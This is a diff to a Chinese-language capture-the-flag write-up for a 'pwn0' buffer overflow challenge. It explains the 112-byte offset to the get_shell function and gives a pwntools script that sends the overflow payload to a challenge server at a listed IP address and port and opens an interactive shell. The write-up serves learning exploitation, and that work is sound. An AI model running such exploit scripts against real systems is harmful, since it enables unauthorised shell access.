@@ -89,12 +89,13 @@ int get_shell()
 
 查看左侧相对于基址的偏移量，我们可以计算得需要填充 `0x6c+0x4` 个字节，即 `112` 个字节，再填入 `get_shell` 的地址（在ida中寻找） `0x080491F6` 即可。
 
-于是脚本如下
+
+根据题目给到的ip和端口，有脚本如下
 
 ```python
 from pwn import *
 
-conn=connect("58.87.70.227",10014)
+conn=connect("58.87.70.227",10009)
 payload=b"a"*112+p32(0x080491F6)
 
 conn.recvline()
@@ -104,3 +105,7 @@ conn.interactive()
 ```
 
 `payload` 即为构造的输入
+
+在Linux中运行脚本，随后得到`flag`（**注意这里的`flag`是变动的**）
+
+![1732462300061](image/pwn0-wp/1732462300061.png)
